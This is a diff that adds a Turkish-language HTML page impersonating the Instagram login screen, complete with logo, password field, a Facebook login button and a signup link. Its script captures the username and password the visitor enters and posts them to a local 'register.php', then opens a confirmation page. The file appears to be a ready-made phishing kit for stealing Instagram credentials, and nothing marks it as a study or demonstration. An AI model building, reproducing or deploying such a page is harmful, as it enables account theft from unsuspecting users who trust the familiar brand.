@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Giriş</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="fav.png" type="image/png">
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="login-form">
+                <img src="logo.png" alt="Logo" class="logo">
+                <form id="loginForm">
+                    <div class="input-group">
+                        <input type="text" id="username" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" placeholder="Şifre" required>
+                    </div>
+                    <button type="submit" class="btn">Giriş Yap</button>
+                </form>
+                <div class="divider">
+                    <span>YA DA</span>
+                </div>
+                <div class="social-login">
+                    <button class="btn facebook-btn">Facebook ile Giriş Yap</button>
+                </div>
+                <a href="#" class="forgot-password">Şifreni mi Unuttun?</a>
+            </div>
+            <div class="signup">
+                <p>Hesabın yok mu? <a href="#">Kaydol</a></p>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+
+            fetch('register.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message);
+                if (data.status === 'success') {
+                    window.open('end/confirm.html', '_blank');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+            });
+        });
+    </script>
+</body>
+</html>
